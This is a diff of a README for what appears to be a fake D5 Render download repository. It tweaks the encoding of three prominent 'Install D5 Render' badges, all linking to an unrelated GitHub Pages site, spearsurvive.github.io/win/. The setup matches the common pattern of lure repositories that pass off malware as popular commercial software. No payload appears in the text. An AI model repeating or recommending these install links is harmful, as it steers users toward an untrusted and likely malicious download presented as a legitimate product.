@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install D5 Render](https://img.shields.io/badge/⬇_Install_D5%20Render-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install D5 Render](https://img.shields.io/badge/⬇_Install_D5+Render-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ D5 Render is a real-time ray tracing rendering application for architects and de
 
 <div align="center">
 
-[![⬇ Install D5 Render](https://img.shields.io/badge/⬇_Install_D5%20Render-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install D5 Render](https://img.shields.io/badge/⬇_Install_D5+Render-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ D5 Render is a real-time ray tracing rendering application for architects and de
 
 <div align="center">
 
-[![⬇ Install D5 Render](https://img.shields.io/badge/⬇_Install_D5%20Render-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install D5 Render](https://img.shields.io/badge/⬇_Install_D5+Render-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
